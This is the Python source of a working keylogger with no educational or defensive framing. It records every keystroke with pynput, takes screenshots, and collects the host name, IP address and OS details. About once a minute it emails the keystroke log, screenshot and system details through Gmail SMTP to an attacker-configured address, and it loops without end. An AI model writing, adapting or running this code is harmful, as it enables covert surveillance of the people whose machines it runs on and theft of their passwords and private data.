from Account_Detail import From_Email,Password,To_Email #Login Detail
import datetime
import time
import smtplib                                 # for EMail sedding
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pynput.keyboard import Key, Listener      #Keyboard key store
import pyscreenshot as screen_capture          # for screen shot
import socket
import platform
import os


wait = 1
email_id = From_Email
passd = Password

try:
    test_mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
    test_mail.starttls()
    test_mail.login(email_id, password=passd)
    test_mail.close()
except:
        print('USERNAME AND OR YOUR PASSWORD IS WRONG')
password = passd

dir_path = '{}/Logger'.format(os.path.expanduser('~'))

if os.path.isdir(dir_path):
    pass
else:
    os.makedirs(dir_path)
 # file create but hide Not showing on pc
screenshot_path = '{}/Logger/screenshot.png'.format(os.path.expanduser('~'))
computer_information_path = '{}/Logger/computer_info.txt'.format(os.path.expanduser('~'))
keylog_path = '{}/Logger/log.txt'.format(os.path.expanduser('~'))

with open(keylog_path, 'w') as file:
    file.write(' ')
    file.close()
with open(computer_information_path, 'w') as file:
    file.write(' ')
    file.close()
#time and minint setup
current_datetime = datetime.datetime.now()
current_time = time.localtime()
now = datetime.datetime.now()


wait_time = float(wait)  # Minutes
send_time = now + datetime.timedelta(minutes=wait_time)

iteration_limit_counter = 0
iteration_limit = 1000
count = 0
keys = []
#key storing
all_keys = ['_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_','_''_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_' , '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n']

iterations = 0

def screenshot():
    image = screen_capture.grab()
    image.save(screenshot_path)  # .format(current_datetime))


def computer_information():
    host_name = socket.gethostname()
    IP = socket.gethostbyname(host_name)

    with open(computer_information_path, 'w') as file:
        file.write("\nSystem: {}, {}".format(platform.system(), platform.version()))
        file.write("\nProcessor: {}".format(platform.processor()))
        file.write("\nMachine: {}".format(platform.machine()))
        file.write("\nHost Name: {}".format(host_name))
        file.write("\nIP Address: {}".format(IP))
        file.close()


def organize_file(iteration_counter):
    global iteration_limit_counter
    if iteration_counter % 1 == 0:
        iteration_limit_counter += 1

        with open(keylog_path, 'w') as log:
            for key in all_keys:
                k = str(key).replace("'", "")
                if k.find('space') > 0:
                    log.write(' ')
                elif str(key).find('enter') > 0:
                    log.write('\n <<enter pressed>>\n')
                else:
                    log.write(k)
            log.close()
    else:
        pass

def send_email(email_address, password):

    address_from = email_address
    address_to = To_Email

    msg = MIMEMultipart()
    msg['From'] = address_from
    msg['To'] = address_to

    msg['Subject'] = "{}'s Log - {}".format(socket.gethostname(), datetime.datetime.now().replace(microsecond=0))

    body = "Please Find Attached: \na) Log.txt containing keylog of {}\nb) Screenshot from {}\nc) The User " \
           "information\n\nRegards,\nLogger".format(datetime.datetime.now().replace(microsecond=0),
                                                    datetime.datetime.now().replace(microsecond=0))

    msg.attach(MIMEText(body, 'plain'))

    log_file = "log.txt"  # .format(current_datetime)
    screenshot_file = "logshot.png"
    user_info_file = "UserInfo.txt"
  #attachment file
    attachment_1 = MIMEApplication(open(keylog_path, 'rb').read(), _subtype='txt')
    attachment_1.add_header('Content-Disposition', "attachment; filename= %s" % log_file)
    msg.attach(attachment_1)
    attachment_2 = MIMEApplication(open(screenshot_path, 'rb').read(), _subtype='png')
    attachment_2.add_header('Content-Disposition', "attachment; filename= %s" % screenshot_file)
    msg.attach(attachment_2)
    attachment_3 = MIMEApplication(open(computer_information_path, 'rb').read(), _subtype='txt')
    attachment_3.add_header('Content-Disposition', "attachment; filename= %s" % user_info_file)
    msg.attach(attachment_3)
    #####
    mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
    mail.starttls()
    mail.login(address_from, password=password)
    text = msg.as_string()
    mail.sendmail(address_from, address_to, text)
    mail.quit()

while type(2) == int:
    send = True
    def on_press(key):
        global keys, count, all_keys
        keys.append(key)
        all_keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []
    def write_file(keys):
        global iterations
        with open(keylog_path, 'a') as log:
            for key in keys:
                iterations += 1
                if str(key).find('backspace') > 0:
                    factored_key = all_keys[all_keys.index(key) - 2]
                    all_keys.pop(all_keys.index(key) - 1)
                    all_keys.pop(all_keys.index(key))
                else:
                    factored_key = all_keys[all_keys.index(key)]

                refined_key = str(factored_key).replace("'", "")
                if refined_key.find('space') > 0:
                    log.write('\n')
                    log.close()
                else:
                    log.write(refined_key)
                    log.close()
                    organize_file(iteration_counter=iterations)

    def on_release(key):
        if datetime.datetime.now() > send_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if datetime.datetime.now() > send_time:
        screenshot()
        computer_information()
        try:
            send_email(str(email_id), password=password)
            with open(keylog_path, 'w') as file:
                file.write(' ')
                file.close()
            all_keys.clear()

            all_keys = ['_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_''_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_', '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n']
        except:
            print('\n\nLog failed to send email at: {}\n'.format(datetime.datetime.now().replace(microsecond=0)))
            pass
        send_time = datetime.datetime.now() + datetime.timedelta(minutes=wait_time)

screenshot()
computer_information()
try:
    send_email(str(email_id), password=password)
except:
    pass
print('\nLog ended on: {}'.format(datetime.datetime.now().replace(microsecond=0)))
